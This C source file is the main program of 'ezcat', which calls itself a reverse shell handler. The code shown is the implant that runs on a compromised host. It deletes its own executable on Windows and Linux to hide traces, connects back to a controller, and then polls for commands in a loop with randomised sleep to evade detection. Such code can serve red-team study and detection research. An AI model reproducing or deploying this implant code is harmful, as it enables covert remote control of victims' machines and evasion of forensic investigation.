// clang-format off

/*
 *  ezcat | easy reverse shell handler
 *  written by ngn (https://ngn.tf) (2024)
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <https://www.gnu.org/licenses/>.
 *
 */

// clang-format on

#ifdef _WIN32
// clang-format off
#include <winsock2.h>
#include <windows.h>
// clang-format on
#endif
#include <errno.h>
#include <limits.h>
#include <signal.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#include "agent.h"
#include "cmd.h"
#include "util.h"

#define SLEEP_MAX 10
#define SLEEP_MIN 3

agent_t agent;

void end(int sig) {
  if (sig == SIGSEGV)
    debug("received segfault");

  agent_disconnect(&agent);
#ifdef _WIN32
  WSACleanup();
#endif
  exit(1);
}

int main(int argc, char **argv) {
  int ret = EXIT_FAILURE;

  // used for cleaning up the program
#ifndef _WIN32
  signal(SIGTRAP, end);
  signal(SIGKILL, end);
#endif
  signal(SIGSEGV, end);
  signal(SIGINT, end);

  // setup inital vars, seed the pseudo rng
  srand(time(NULL));

  // self delete
#ifdef _WIN32
  char selfpath[MAX_PATH];
  GetModuleFileNameA(NULL, selfpath, MAX_PATH);

  HANDLE shandle = CreateFile(selfpath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (INVALID_HANDLE_VALUE == shandle) {
    debug("failed to get handle for self");
    goto cont;
  }

  FILE_RENAME_INFO rename_info;
  wchar_t         *name        = L":lmao";
  ssize_t          rename_size = sizeof(rename_info) + sizeof(name);

  bzero(&rename_info, sizeof(rename_info));

  rename_info.FileNameLength = sizeof(name);
  RtlCopyMemory(rename_info.FileName, name, sizeof(name));

  if (SetFileInformationByHandle(shandle, FileRenameInfo, &rename_info, rename_size) == 0) {
    debug("failed to set rename info for self");
    CloseHandle(shandle);
    goto cont;
  }

  CloseHandle(shandle);

  shandle = CreateFile(argv[0], DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (INVALID_HANDLE_VALUE == shandle) {
    debug("failed to get handle for self");
    goto cont;
  }

  FILE_DISPOSITION_INFO del_info;
  bzero(&del_info, sizeof(del_info));
  del_info.DeleteFile = true;

  if (SetFileInformationByHandle(shandle, FileDispositionInfo, &del_info, sizeof(del_info)) == 0) {
    debug("failed to set disposition info for self");
    CloseHandle(shandle);
    goto cont;
  }

  CloseHandle(shandle);
#else
  char selfpath[PATH_MAX];

  if (readlink("/proc/self/exe", selfpath, PATH_MAX) < 0) {
    debug("failed to readlink of /proc/self/exe");
    goto cont;
  }

  if (unlink(selfpath) != 0) {
    debug("failed to unlink self");
    goto cont;
  }
#endif

cont:
  if (!agent_connect(&agent))
    goto end;

  if (!cmd_register(&agent))
    goto end;

  while (true) {
    if (!cmd_handle(&agent))
      break;
    sleep(randint(SLEEP_MIN, SLEEP_MAX));
  }

  // cleanup and return
  ret = EXIT_SUCCESS;

end:
  agent_disconnect(&agent);
#ifdef _WIN32
  WSACleanup();
#endif
  return ret;
}
